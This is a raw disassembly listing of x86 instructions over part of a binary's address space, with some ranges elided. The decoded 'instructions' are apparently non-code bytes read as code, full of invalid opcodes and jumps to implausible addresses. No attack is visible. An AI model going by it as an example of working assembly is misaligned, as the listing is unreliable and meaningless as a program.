  42e822:	sbb    cl,BYTE PTR [edi+0x44]
  42e825:	or     esi,ebx
  42e827:	and    bh,BYTE PTR [ebx+0x11]
  42e82a:	repz cmp DWORD PTR [ecx-0x18],ebp
  42e82e:	repz int3 
  42e830:	cmp    BYTE PTR [edi+0x414a6a3a],ch
  42e836:	les    ebx,FWORD PTR [eax]
  42e838:	dec    edi
  42e839:	into   
  42e83a:	shr    BYTE PTR fs:[edi+edx*2+0x7c],cl
  42e83f:	pop    edx
  42e840:	ins    DWORD PTR es:[edi],dx
  42e841:	mov    ah,0xfb
  42e843:	inc    esi
  42e844:	int3   
  42e845:	fsubr  DWORD PTR [ecx]
  42e847:	ror    BYTE PTR [ecx+0x497946f5],1
  42e84d:	bound  ecx,QWORD PTR [esi]
  42e84f:	into   
  42e850:	icebp  
  42e851:	daa    
  42e852:	(bad)  
  42e853:	(bad)  
  42e854:	sti    
  42e855:	cmp    bl,dh
  42e857:	xor    eax,0x61bfccbd
  42e85c:	jmp    0x42e857
  42e85e:	mov    dh,0x44
  42e860:	call   0xa0f467ce
  42e865:	jmp    0x42e8af
  42e867:	test   BYTE PTR [edx+0x151c40e7],ch
  42e86d:	push   esp
  42e86e:	adc    DWORD PTR [ebp-0x59],0x36
  42e872:	cdq    
  42e873:	pop    esi
  42e874:	mov    eax,ds:0xedae053e
  42e879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e87a:	pop    es
  42e87b:	shr    BYTE PTR [edi+0x136f14cc],0x3f
  42e882:	sub    BYTE PTR [ecx-0x45ff1e58],0x2f
  42e889:	sbb    DWORD PTR [esi],ebp
  42e88b:	in     al,dx
  42e88c:	and    DWORD PTR [ecx+0x5b],ebx
  42e88f:	or     DWORD PTR ds:0xdc6a1155,esp
  42e895:	jne    0x42e8b9
  42e897:	sbb    edi,ebx
  42e899:	or     al,0x34
  42e89b:	jns    0x42e87c
  42e89d:	xchg   edx,eax
  42e89e:	push   ebp
  42e89f:	xchg   ecx,ebx
  42e8a1:	sti    
  42e8a2:	adc    dl,BYTE PTR ds:0xcef4f0ce
  42e8a8:	xlat   BYTE PTR ds:[ebx]
  42e8a9:	lahf   
  42e8aa:	push   es
  42e8ab:	ffree  st(2)
  42e8ad:	aad    0xce
  42e8af:	xor    ch,BYTE PTR [ebp+0x7b]
  42e8b2:	sti    
  42e8b3:	and    al,0x34
  42e8b5:	cmp    ch,BYTE PTR [edi+ebx*8-0x6f]
  42e8b9:	or     al,0x3e
  42e8bb:	ins    DWORD PTR es:[edi],dx
  42e8bc:	shrd   DWORD PTR [ecx+eax*2-0x4575d012],esp,0x18
  42e8c5:	mov    DWORD PTR [esi+0x6c],eax
  42e8c8:	jnp    0x42e8e9
  42e8ca:	pop    ecx
  42e8cb:	push   edi
  42e8cc:	push   ebp
  42e8cd:	icebp  
  42e8ce:	lea    eax,[si]
  42e8d1:	mov    ds:0x37b2468e,eax
  42e8d6:	inc    ecx
  42e8d7:	lahf   
  42e8d8:	arpl   WORD PTR [ebp+0x695611b9],cx
  42e8de:	scas   eax,DWORD PTR es:[edi]
  42e8df:	xlat   BYTE PTR ds:[ebx]
  42e8e0:	jg     0x42e876
  42e8e2:	aas    
  42e8e3:	gs pop eax
  42e8e5:	fbld   TBYTE PTR [edx]
  42e8e7:	call   0x84:0xfeb324a1
	...
  42e956:	ret    
  42e957:	ja     0x42e9b9
  42e959:	and    al,0xf4
  42e95b:	aaa    
  42e95c:	(bad)  
  42e95d:	div    DWORD PTR [ecx-0x6fdc07d5]
  42e963:	mov    dl,0x3b
  42e965:	mov    ds:0x1f24b,eax
  42e96a:	inc    DWORD PTR [eax]
  42e96c:	add    BYTE PTR [eax],al
  42e96e:	cwde   
  42e96f:	mov    BYTE PTR [ebp-0x7f0be6d8],dh
  42e975:	ret    0x6b49
  42e978:	mov    ebx,0xbd6ef810
  42e97d:	xor    BYTE PTR [ebp+0x2a],bh
  42e980:	ss xchg edi,eax
  42e982:	call   ecx
  42e984:	mov    eax,ds:0x2fb761aa
  42e989:	test   BYTE PTR [esi+0x37b2e89],ah
  42e98f:	fwait
  42e990:	jb     0x42e96e
  42e992:	inc    esi
  42e993:	jle    0x42e93a
  42e995:	(bad)  
  42e996:	enter  0x49ce,0x68
  42e99a:	dec    esp
  42e99b:	mov    al,0x6b
  42e99d:	je     0x42e93a
  42e99f:	sub    eax,0xeaaee19a
  42e9a4:	(bad)  
  42e9a5:	shr    ch,0xaf
  42e9a8:	add    eax,DWORD PTR [edx]
  42e9aa:	xor    eax,0x45d961dd
  42e9af:	adc    BYTE PTR [ebp-0x5d3d9cd3],al
  42e9b5:	jle    0x42e954
  42e9b7:	xchg   ebx,eax
  42e9b8:	shl    DWORD PTR [eax-0x73],1
  42e9bb:	div    dh
  42e9bd:	cmp    eax,0xa737c33f
  42e9c2:	pop    DWORD PTR [eax+0x46]
  42e9c5:	iret   
  42e9c6:	inc    edi
  42e9c7:	shl    DWORD PTR [edi-0x44],cl
  42e9ca:	fisubr DWORD PTR [ecx-0x5d]
  42e9cd:	fdiv   DWORD PTR [ebx]
  42e9cf:	inc    esi
  42e9d0:	data16 mov ?,WORD PTR [esi]
  42e9d3:	outs   dx,DWORD PTR ds:[esi]
  42e9d4:	pop    ecx
  42e9d5:	xor    ebp,esp
  42e9d7:	(bad)  
  42e9d8:	mov    WORD PTR [edi+ecx*1-0x47],ss
  42e9dc:	mov    ecx,0xeb23224d
  42e9e1:	jbe    0x42e9c2
  42e9e3:	inc    esi
  42e9e4:	add    dh,al
  42e9e6:	mov    dh,0xfe
  42e9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9e9:	leave  
  42e9ea:	mov    ss,WORD PTR cs:[eax+0x1c6736cd]
  42e9f1:	aad    0xcd
  42e9f3:	cmp    DWORD PTR [edx-0x43194848],0xffffffce
  42e9fa:	xor    eax,0x240726f3
  42e9ff:	pop    es
  42ea00:	and    ecx,DWORD PTR [ecx+0x4561ae0e]
  42ea06:	outs   dx,DWORD PTR ds:[esi]
  42ea07:	mov    ecx,0x3ba250f1
  42ea0c:	jo     0x42e9ba
  42ea0e:	add    eax,0x118b3fcf
  42ea13:	pop    es
  42ea14:	inc    edi
  42ea15:	push   ebp
  42ea16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ea17:	sti    
  42ea18:	jge    0x42e9f8
  42ea1a:	std    
  42ea1b:	mov    ah,0x3f
  42ea1d:	mov    ecx,edx
  42ea1f:	and    eax,0xdab6e8c4
  42ea24:	mov    DWORD PTR [edi],ebp
  42ea26:	cmp    DWORD PTR [esi+0x4c],edi
  42ea29:	outs   dx,BYTE PTR ds:[esi]
  42ea2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea2b:	stos   BYTE PTR es:[edi],al
  42ea2c:	adc    esp,DWORD PTR [edx]
  42ea2e:	xchg   ebp,eax
  42ea2f:	pop    esp
  42ea30:	push   edi
  42ea31:	stos   BYTE PTR es:[edi],al
  42ea32:	icebp  
  42ea33:	sub    BYTE PTR [ebx],dl
  42ea35:	lahf   
  42ea36:	clc    
  42ea37:	xchg   ecx,eax
  42ea38:	sub    DWORD PTR [ecx-0x5c],ebp
  42ea3b:	jmp    0x1a3d61c4
  42ea40:	or     esp,DWORD PTR [esi+0x6b1fee12]
  42ea46:	mov    eax,0x6617fe7a
  42ea4b:	pop    edi
  42ea4c:	mov    cl,0x1f
  42ea4e:	pop    edx
  42ea4f:	sar    BYTE PTR [edx],0x42
  42ea52:	js     0x42ea4c
  42ea54:	cmp    BYTE PTR [eax+0x6a],0x94
  42ea58:	cmp    cl,BYTE PTR [eax+esi*8+0x3ef7eb95]
  42ea5f:	sub    bh,BYTE PTR [edi+0x23176bd8]
  42ea65:	ret    0xd931
  42ea68:	dec    edx
  42ea69:	mov    BYTE PTR [edi+0xb258],bl
	...
  42ead3:	add    BYTE PTR [eax],al
  42ead5:	add    ch,ah
  42ead7:	mov    edx,0xebdfe392
  42eadc:	cmc    
  42eadd:	mov    esi,0x66dc160c
  42eae2:	mov    al,0x84
  42eae4:	clc    
  42eae5:	push   ebp
  42eae6:	dec    edx
  42eae7:	repz add DWORD PTR [eax],eax
  42eaea:	inc    DWORD PTR [eax]
  42eaec:	add    BYTE PTR [eax],al
  42eaee:	ja     0x42eab7
  42eaf0:	fs mov ebp,0x853a2fb8
  42eaf6:	mov    bl,0x91
  42eaf8:	or     al,BYTE PTR [ebp-0x6001cca5]
  42eafe:	xor    DWORD PTR [ebx+eax*4-0x550d2dbd],edi
  42eb05:	adc    ch,BYTE PTR [edx-0x2bd1b79d]
  42eb0b:	jmp    0x88aec6a
  42eb10:	sbb    DWORD PTR [ebx],ebx
  42eb12:	shl    ch,1
  42eb14:	iret   
  42eb15:	scas   eax,DWORD PTR es:[edi]
  42eb16:	inc    esi
  42eb17:	xor    BYTE PTR [esi-0x7bb99b80],bl
  42eb1d:	imul   DWORD PTR [ecx+esi*4]
  42eb20:	jp     0x42eb0a
  42eb22:	sub    DWORD PTR [esp+edi*4-0x54b09a56],0xd26e6295
  42eb2d:	cs and eax,0x333c6000
  42eb33:	mov    cl,0xca
  42eb35:	dec    edx
  42eb36:	jnp    0x42eb9d
  42eb38:	cmp    BYTE PTR [ebp-0xb],al
  42eb3b:	cs fsubp st(7),st
  42eb3e:	cmp    esi,DWORD PTR [ebx+0x68]
  42eb41:	lods   eax,DWORD PTR ds:[esi]
  42eb42:	push   0x77
  42eb44:	into   
  42eb45:	xchg   edi,eax
  42eb46:	dec    ebx
  42eb47:	bound  eax,QWORD PTR [ebp-0x719d1361]
  42eb4d:	and    al,0xb7
  42eb4f:	leave  
  42eb50:	ins    BYTE PTR es:[edi],dx
  42eb51:	mov    edx,0x5e973e82
  42eb56:	test   al,0xf8
  42eb58:	dec    edx
  42eb59:	mov    ebp,edx
  42eb5b:	imul   esi,DWORD PTR [ebp+0x6f17e296],0xb3667d32
  42eb65:	mov    dl,0xba
  42eb67:	xchg   esp,eax
  42eb68:	daa    
  42eb69:	inc    eax
  42eb6a:	jnp    0x42eb0d
  42eb6c:	std    
  42eb6d:	pop    eax
  42eb6e:	dec    esp
  42eb6f:	jb     0x42eb23
  42eb71:	or     eax,0x1cef04b
  42eb76:	in     eax,0x97
  42eb78:	mov    dl,0x31
  42eb7a:	ja     0x42eb93
  42eb7c:	fwait
  42eb7d:	mov    edi,0x1c6f7984
  42eb82:	jp     0x42eb6f
  42eb84:	push   eax
  42eb85:	popf   
  42eb86:	mov    ebx,0x3cfee3eb
  42eb8b:	adc    ecx,DWORD PTR [esi]
  42eb8d:	cmp    BYTE PTR [ebx-0x1f],cl
  42eb90:	xchg   ebp,eax
  42eb91:	sub    eax,0xbedac8e8
  42eb96:	ds daa 
  42eb98:	add    ebp,DWORD PTR [eax]
  42eb9a:	ins    DWORD PTR es:[edi],dx
  42eb9b:	sub    dh,dh
  42eb9d:	fmul   DWORD PTR [eax+0x1f023b60]
  42eba3:	mov    ecx,0x9beb97aa
  42eba8:	enter  0x8024,0xe3
  42ebac:	loope  0x42eb9e
  42ebae:	lods   al,BYTE PTR ds:[esi]
  42ebaf:	out    0xa,eax
  42ebb1:	cs sub eax,0x3cb72883
  42ebb7:	xchg   edi,ecx
  42ebb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ebba:	mov    ds:0x9d0b1e95,al
  42ebbf:	xchg   ecx,eax
  42ebc0:	push   ebx
  42ebc1:	ja     0x42ebcb
  42ebc3:	mov    ?,edx
  42ebc5:	xor    bl,BYTE PTR [ebx-0xa2d51ec]
  42ebcb:	jl     0x42ec10
  42ebcd:	jmp    0x409a894d
  42ebd2:	dec    ebp
  42ebd3:	xlat   BYTE PTR ds:[ebx]
  42ebd4:	xchg   DWORD PTR [edx],eax
  42ebd6:	mov    ds:0x515cf1c,al
  42ebdb:	sub    edx,DWORD PTR [ebx-0x39]
  42ebde:	outs   dx,BYTE PTR ds:[esi]
  42ebdf:	dec    esi
  42ebe0:	(bad)  [ebp+0x2c]
  42ebe3:	push   ecx
  42ebe4:	sahf   
  42ebe5:	xor    BYTE PTR [ebx+0x525f5f76],dl
  42ebeb:	mov    dl,0x39
	...
  42ec55:	add    BYTE PTR [esi+0x41],bh
  42ec58:	jne    0xfc41bb9d
  42ec5e:	pusha  
  42ec5f:	popf   
  42ec60:	pop    ecx
  42ec61:	sbb    ecx,0x4921dd7b
  42ec67:	hlt    
  42ec68:	add    DWORD PTR [eax],eax
  42ec6a:	inc    DWORD PTR [eax]
  42ec6c:	add    BYTE PTR [eax],al
  42ec6e:	jg     0x42ec91
  42ec70:	or     BYTE PTR [ebx+0x11906bab],bl
  42ec76:	mov    esi,0xd84013a6
  42ec7b:	mov    esp,0x3859ec9b
  42ec80:	shl    DWORD PTR [ecx-0x5d04d5be],0xe3
  42ec87:	sub    eax,0x777742d3
  42ec8c:	and    al,0x99
  42ec8e:	in     al,dx
  42ec8f:	adc    BYTE PTR [edi],dl
  42ec91:	pop    ds
  42ec92:	rcr    BYTE PTR [ecx-0x2c],1
  42ec95:	push   DWORD PTR ds:0x71d2998f
  42ec9b:	xor    esp,DWORD PTR [edx+0x1d7a5f66]
  42eca1:	inc    ecx
  42eca2:	push   ecx
  42eca3:	jb     0x42ec33
  42eca5:	je     0x42ed0e
  42eca7:	aam    0xd0
  42eca9:	xor    ebx,DWORD PTR [ebx-0x12]
  42ecac:	xchg   BYTE PTR [ebx],ch
  42ecae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecaf:	outs   dx,BYTE PTR ds:[esi]
  42ecb0:	mov    ds:0xae07d73d,eax
  42ecb5:	xor    BYTE PTR ss:[edx+0x737539b8],ah
  42ecbc:	outs   dx,DWORD PTR ds:[esi]
  42ecbd:	cli    
  42ecbe:	jnp    0x42ecf7
  42ecc0:	lods   al,BYTE PTR ds:[esi]
  42ecc1:	popa   
  42ecc2:	jg     0x42eccf
  42ecc4:	xlat   BYTE PTR ds:[ebx]
  42ecc5:	pop    esi
  42ecc6:	repz pop ecx
  42ecc8:	push   ebx
  42ecc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecca:	dec    ebx
  42eccb:	or     al,BYTE PTR [ebx-0x4d]
  42ecce:	scas   eax,DWORD PTR es:[edi]
  42eccf:	mul    BYTE PTR [eax]
  42ecd1:	or     BYTE PTR [ebp-0x241112e],ch
  42ecd7:	add    eax,0x4ba06354
  42ecdc:	cmp    DWORD PTR [eax+ebp*4],0xffffffca
  42ece0:	bound  edx,QWORD PTR [ecx+ebp*8-0x62]
  42ece4:	sub    dh,dl
  42ece6:	mov    ah,0xa2
  42ece8:	in     al,dx
  42ece9:	clc    
  42ecea:	adc    al,0x74
  42ecec:	xor    DWORD PTR [ecx],0xffffffe5
  42ecef:	or     eax,0xc77cac69
  42ecf4:	sbb    ah,al
  42ecf6:	ins    DWORD PTR es:[edi],dx
  42ecf7:	enter  0x5364,0x7
  42ecfb:	aas    
  42ecfc:	lods   eax,DWORD PTR ds:[esi]
  42ecfd:	inc    ebx
  42ecfe:	mov    esi,0xaa182967
  42ed03:	shl    DWORD PTR [ecx+esi*8-0x262bcf12],cl
  42ed0a:	jmp    0x1464dd68
  42ed0f:	in     eax,dx
  42ed10:	fstp   QWORD PTR [esi+eax*4+0x1f1b8f37]
  42ed17:	cs sbb al,0xf1
  42ed1a:	sub    DWORD PTR [esi],ebp
  42ed1c:	stos   BYTE PTR es:[edi],al
  42ed1d:	test   al,0x28
  42ed1f:	ja     0x42ed66
  42ed21:	std    
  42ed22:	xchg   ebx,eax
  42ed23:	mov    DWORD PTR [ecx+0x37],ecx
  42ed26:	lea    ebp,[edi]
  42ed28:	cmp    DWORD PTR [ecx+0x6d9819be],esp
  42ed2e:	xor    eax,0x9467d9bd
  42ed33:	dec    edx
  42ed34:	cmp    BYTE PTR [edi-0x32],0x3f
  42ed38:	adc    eax,0x15df2a4e
  42ed3d:	add    DWORD PTR [esi],ebx
  42ed3f:	xor    ebp,ecx
  42ed41:	sar    esi,cl
  42ed43:	pop    ds
  42ed44:	dec    esi
  42ed45:	pop    esi
  42ed46:	sar    DWORD PTR [esi+0x6e],1
  42ed49:	mov    ch,BYTE PTR [edi]
  42ed4b:	mov    WORD PTR [ebp-0x7],?
  42ed4e:	jmp    0x42eda9
  42ed50:	mov    edx,0x8e5b49b1
  42ed55:	jecxz  0x42ed5a
  42ed57:	pushf  
  42ed58:	fwait
  42ed59:	pop    es
  42ed5a:	mov    ebx,0x8b90eec0
  42ed5f:	mov    esi,0xd2952622
  42ed64:	xchg   edx,eax
  42ed65:	cmp    DWORD PTR ds:0x2feb20e4,edx
  42ed6b:	mov    edi,0x8a
	...
  42edd4:	add    BYTE PTR [eax],al
  42edd6:	sub    dh,dh
  42edd8:	scas   eax,DWORD PTR es:[edi]
  42edd9:	fdivr  st,st(7)
  42eddb:	fnstcw WORD PTR [edi-0xa]
  42edde:	jecxz  0x42ee12
  42ede0:	test   DWORD PTR [edx+0x49c41489],esp
  42ede6:	dec    eax
  42ede7:	cmc    
  42ede8:	add    DWORD PTR [eax],eax
  42edea:	inc    DWORD PTR [eax]
  42edec:	add    BYTE PTR [eax],al
  42edee:	hlt    
  42edef:	or     eax,ebx
  42edf1:	daa    
  42edf2:	mov    esi,0xefcf630d
  42edf7:	pop    edi
  42edf8:	adc    cl,BYTE PTR [edi]
  42edfa:	pushf  
  42edfb:	sub    bh,BYTE PTR [ebx]
  42edfd:	or     DWORD PTR [edx],ebp
  42edff:	mov    WORD PTR [ecx+0x559b802b],ds
  42ee05:	cmp    eax,0x87fda87c
  42ee0a:	daa    
  42ee0b:	and    al,0x1e
  42ee0d:	push   ebx
  42ee0e:	movd   mm0,eax
  42ee11:	add    DWORD PTR [eax],esp
  42ee13:	in     al,dx
  42ee14:	data16 and al,0x59
  42ee17:	pop    es
  42ee18:	enter  0xe7ef,0xf
  42ee1c:	repz inc esp
  42ee1e:	mov    eax,ds:0xf58d047f
  42ee23:	sbb    al,0x18
  42ee25:	mov    ecx,0x3da77551
  42ee2a:	popf   
  42ee2b:	fs mov ah,0x36
  42ee2e:	xchg   DWORD PTR [eax+0x5e4a1981],edi
  42ee34:	fs (bad) 
  42ee37:	mov    edx,0xa3e6028
  42ee3c:	jns    0x42ee13
  42ee3e:	ja     0x42eeba
  42ee40:	in     eax,0x8f
  42ee42:	repnz ds test dh,cl
  42ee46:	mov    eax,ds:0x40da8062
  42ee4b:	xchg   esp,eax
  42ee4c:	es mov bl,0x1e
  42ee50:	(bad)
  42ee54:	mov    dl,0xe6
  42ee56:	xor    bl,BYTE PTR [eax]
  42ee58:	(bad)  
  42ee59:	or     bl,dh
  42ee5b:	clc    
  42ee5c:	jns    0x42edfd
  42ee5e:	outs   dx,BYTE PTR ds:[esi]
  42ee5f:	outs   dx,BYTE PTR ds:[esi]
  42ee60:	push   ds
  42ee61:	or     al,0xde
  42ee63:	add    cl,BYTE PTR [eax]
  42ee65:	int    0x36
  42ee67:	fwait
  42ee68:	in     eax,0x2c
  42ee6a:	fist   WORD PTR [ebp-0x20015bcf]
  42ee70:	sbb    DWORD PTR [ebx-0x47],edx
  42ee73:	xor    al,BYTE PTR [ebx-0x70e24e2b]
  42ee79:	repz or eax,esi
  42ee7c:	in     al,dx
  42ee7d:	loop   0x42ee1f
  42ee7f:	fsubr  DWORD PTR [ebx-0x7ac282e0]
  42ee85:	xchg   edx,eax
  42ee86:	and    DWORD PTR [edx+0x71],ebp
  42ee89:	std    
  42ee8a:	xchg   esp,eax
  42ee8b:	mov    ebp,0xac1a5cb8
  42ee90:	pop    ss
  42ee91:	dec    edx
  42ee92:	xchg   ecx,eax
  42ee93:	ins    DWORD PTR es:[edi],dx
  42ee94:	das    
  42ee95:	or     ch,ch
  42ee97:	fst    QWORD PTR [ecx+0x11]
  42ee9a:	or     BYTE PTR [ecx+edi*8+0x4fdd63fa],ch
  42eea1:	adc    BYTE PTR [ebp+0x36],ch
  42eea4:	aaa    
  42eea5:	jns    0x42ef1c
  42eea7:	js     0x42ee77
  42eea9:	xchg   DWORD PTR [eax+esi*8],ebp
  42eeac:	sbb    esi,DWORD PTR [eax+0x73c705c6]
  42eeb2:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eeb4:	test   ah,ch
  42eeb6:	imul   esp,ecx,0xc7cbb4f8
  42eebc:	addr16 adc ecx,0x7f4de3f0
  42eec3:	in     eax,0x32
  42eec5:	(bad)  
  42eec6:	jns    0x42eeab
  42eec8:	inc    ebx
  42eec9:	popf   
  42eeca:	sbb    bh,BYTE PTR [ebp+0x2c6cdf30]
  42eed0:	sbb    al,0x11
  42eed2:	stc    
  42eed3:	shl    dl,1
  42eed5:	imul   ebp,DWORD PTR [ebx-0x36],0xffffffd7
  42eed9:	or     eax,0xa83573f4
  42eede:	int    0x43
  42eee0:	enter  0x59ce,0x18
  42eee4:	xchg   edx,eax
  42eee5:	mov    ch,0xad
  42eee7:	push   0xffffff92
  42eee9:	data16 out 0xe2,al
  42eeec:	enter  0x0,0x0
	...
  42ef54:	add    BYTE PTR [eax],al
  42ef56:	ret    
  42ef57:	add    cl,BYTE PTR [eax]
  42ef59:	xor    eax,0xf6ff3fc9
  42ef5e:	jb     0x42ef9c
  42ef60:	jae    0x42ef87
  42ef62:	rcr    dl,cl
  42ef64:	fucomi st,st(4)
  42ef66:	inc    edi
  42ef67:	test   BYTE PTR [ecx],0x0
  42ef6a:	inc    DWORD PTR [eax]
  42ef6c:	add    BYTE PTR [eax],al
  42ef6e:	retf   0x83db
  42ef71:	call   0x98ed:0xeddf8ebe
  42ef78:	adc    eax,0x29a812bf
  42ef7d:	mov    al,0xcd
  42ef7f:	ror    BYTE PTR [ecx+0x4b],0xe2
  42ef83:	inc    edx
  42ef84:	or     cl,cl
  42ef86:	inc    ebp
  42ef87:	mov    eax,edx
  42ef89:	retf   0x541f
  42ef8c:	sbb    dl,bl
  42ef8e:	fsub   DWORD PTR [esi]
  42ef90:	rcl    ah,1
  42ef92:	jbe    0x42ef9f
  42ef94:	add    al,0xdf
  42ef96:	inc    esp
  42ef97:	js     0x42ef72
  42ef99:	mov    WORD PTR [eax-0x2bd08935],ss
  42ef9f:	xor    DWORD PTR [ebx-0x61eb72d6],0x2cd5258
  42efa9:	loope  0x42f01d
  42efab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42efac:	mov    ebx,0xf3d92858
  42efb1:	pop    edx
  42efb2:	inc    edi
  42efb3:	cwde   
  42efb4:	aas    
  42efb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42efb6:	sub    dh,BYTE PTR [esi-0x8]
  42efb9:	call   0xc38e237f
  42efbe:	in     al,0x16
  42efc0:	jge    0x42ef47
  42efc2:	mov    edx,0xa7eaaa1e
  42efc7:	(bad)  
  42efc9:	sub    al,0x4b
  42efcb:	push   ecx
  42efcc:	out    dx,eax
  42efcd:	add    bl,BYTE PTR [eax-0x7d]
  42efd0:	jns    0x42efeb
  42efd2:	push   esi
  42efd3:	lock and cl,BYTE PTR [ebx]
  42efd6:	lods   eax,DWORD PTR ds:[esi]
  42efd7:	scas   eax,DWORD PTR es:[edi]
  42efd8:	push   cs
  42efd9:	cmp    ah,BYTE PTR [edx+0x58]
  42efdc:	leave  
  42efdd:	call   0x97bd228
  42efe2:	ins    BYTE PTR es:[edi],dx
  42efe3:	pop    ds
  42efe4:	addr16 sbb eax,0xf03a08db
  42efea:	je     0x42f010
  42efec:	inc    esp
  42efed:	(bad)  
  42efee:	nop
  42efef:	jns    0x42f023
  42eff1:	das    
  42eff2:	pushf  
  42eff3:	loopne 0x42efa1
  42eff5:	jge    0x42f056
  42eff7:	sbb    BYTE PTR [edi-0x1555d9d8],dl
  42effd:	mov    DWORD PTR [eax-0x5bae8ffd],esp
  42f003:	repnz xor DWORD PTR [edx+0x11],esp
  42f007:	and    ebx,ebx
  42f009:	inc    ecx
  42f00a:	jmp    0x94b7dfed
  42f00f:	cmp    ah,cl
  42f011:	out    dx,eax
  42f012:	lods   al,BYTE PTR ds:[esi]
  42f013:	mov    dl,0x2b
  42f015:	jg     0x42ef9c
  42f017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f018:	rcr    DWORD PTR [edi+0x70dfac1a],cl
  42f01e:	(bad)  
  42f020:	(bad)  
  42f021:	test   eax,0x20588b69
  42f026:	sahf   
  42f027:	int3   
  42f028:	call   0xcb54:0xe82a0279
  42f02f:	push   ebp
  42f030:	rcl    DWORD PTR [ecx],0xaf
  42f033:	pop    ebp
  42f034:	xchg   ebp,eax
  42f035:	push   edx
  42f036:	jnp    0x42f083
  42f038:	and    al,0xae
  42f03a:	and    al,al
  42f03c:	pop    ds
  42f03d:	and    bh,0x36
  42f040:	pushf  
  42f041:	mov    ds:0xfb96bb89,al
  42f046:	xor    edx,DWORD PTR [esi-0x3e]
  42f049:	xor    DWORD PTR [eax],edx
  42f04b:	mov    ?,eax
  42f04d:	jecxz  0x42f00a
  42f04f:	inc    eax
  42f050:	and    al,0xc1
  42f052:	addr16 mov ebx,0x62fc75f0
  42f058:	mov    ebx,0xc6536359
  42f05d:	cmc    
  42f05e:	cdq    
  42f05f:	inc    esp
  42f060:	xchg   BYTE PTR ds:0x7fd78c92,dh
  42f066:	pop    es
  42f067:	add    eax,0x217458c4
  42f06c:	dec    esp
	...
  42f0d5:	add    BYTE PTR [edx],dl
  42f0d7:	ds int 0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	std    
  42f0e3:	(bad)  
  42f0e4:	popa   
  42f0e5:	mov    dh,0x46
  42f0e7:	test   DWORD PTR [ecx],0xff00
  42f0ed:	add    BYTE PTR [esi+ebp*8-0x34ab662],dh
  42f0f4:	adc    al,0xf3
  42f0f6:	xlat   BYTE PTR ds:[ebx]
  42f0f7:	fldenv [ecx-0x35543989]
  42f0fd:	imul   ebp,DWORD PTR [esi+0x40],0x4c
  42f101:	pop    ecx
  42f102:	es nop
  42f104:	add    BYTE PTR [ecx-0x47],al
  42f107:	in     al,dx
  42f108:	lea    esi,[edi+0x43]
  42f10b:	ins    BYTE PTR es:[edi],dx
  42f10c:	pop    ebp
  42f10d:	cmp    eax,0x4fc0977f
  42f112:	sahf   
  42f113:	pop    esi
  42f114:	push   esi
  42f115:	out    0xd9,al
  42f117:	jnp    0x42f196
  42f119:	push   edi
  42f11a:	outs   dx,BYTE PTR ds:[esi]
  42f11b:	fnstcw WORD PTR [ebx+0x63]
  42f11e:	or     eax,0xbfc40c3e
  42f123:	(bad)  
  42f124:	cmp    DWORD PTR [esi-0x5e31354c],edi
  42f12a:	cli    
  42f12b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f12d:	mov    edx,0x53e874ff
  42f132:	mov    eax,DWORD PTR [esi+0x6acf09c5]
  42f138:	inc    edx
  42f139:	cs pusha 
  42f13b:	mov    ds:0xcbdf31e1,eax
  42f140:	retf   0x871b
  42f143:	jns    0x42f19a
  42f145:	jg     0x42f1a2
  42f147:	lds    eax,FWORD PTR [eax]
  42f149:	out    dx,eax
  42f14a:	scas   al,BYTE PTR es:[edi]
  42f14b:	and    eax,0x13f4d4a3
  42f150:	lds    ebx,FWORD PTR [eax-0x1eacae48]
  42f156:	jecxz  0x42f173
  42f158:	ins    DWORD PTR es:[edi],dx
  42f159:	aaa    
  42f15a:	repnz cmc 
  42f15c:	dec    edi
  42f15d:	mov    cl,0x47
  42f15f:	pop    edx
  42f160:	mov    edi,DWORD PTR [ebx+0x41]
  42f163:	adc    al,0x9a
  42f165:	stc    
  42f166:	mov    gs,edx
  42f168:	fnstcw WORD PTR [ecx+0x6]
  42f16b:	jo     0x42f13f
  42f16d:	inc    eax
  42f16e:	push   es
  42f16f:	mov    WORD PTR [ebp-0x43],cs
  42f172:	push   0xba9ad37a
  42f177:	cmp    ebp,DWORD PTR [ebx+0x7a2a1e47]
  42f17d:	push   edx
  42f17e:	sbb    ch,ah
  42f180:	sbb    eax,0xad80bd95
  42f185:	mov    al,ds:0x4c821c0e
  42f18a:	popa   
  42f18b:	sub    DWORD PTR [edx+0x254755e0],ebp
  42f191:	setne  BYTE PTR [ebp-0x1ec5cd9a]
  42f198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f199:	dec    ecx
  42f19a:	push   esi
  42f19b:	xchg   edi,eax
  42f19c:	cmp    eax,esp
  42f19e:	cmp    al,0x4a
  42f1a0:	cmp    ebp,ebp
  42f1a2:	add    edi,edi
  42f1a4:	aas    
  42f1a5:	cmc    
  42f1a6:	inc    ebx
  42f1a7:	rcl    ebx,cl
  42f1a9:	(bad)  
  42f1aa:	jbe    0x42f1cf
  42f1ac:	jnp    0x42f1df
  42f1ae:	stos   DWORD PTR es:[edi],eax
  42f1af:	mov    esp,DWORD PTR [edx-0x70bdcc73]
  42f1b5:	mov    eax,0x845684aa
  42f1ba:	loop   0x42f1ea
  42f1bc:	sbb    ebx,DWORD PTR [edi+0x20]
  42f1bf:	inc    esp
  42f1c0:	sub    esi,DWORD PTR [eax+0x506a2aee]
  42f1c6:	adc    DWORD PTR [ecx],0x6d
  42f1c9:	xchg   DWORD PTR [ebp-0x23],esi
  42f1cc:	xchg   esp,eax
  42f1cd:	pop    ss
  42f1ce:	(bad)  
  42f1cf:	loop   0x42f184
  42f1d1:	cld    
  42f1d2:	xor    BYTE PTR [edi+0x758323d],bl
  42f1d8:	shl    DWORD PTR [edx+0x18e10ed0],cl
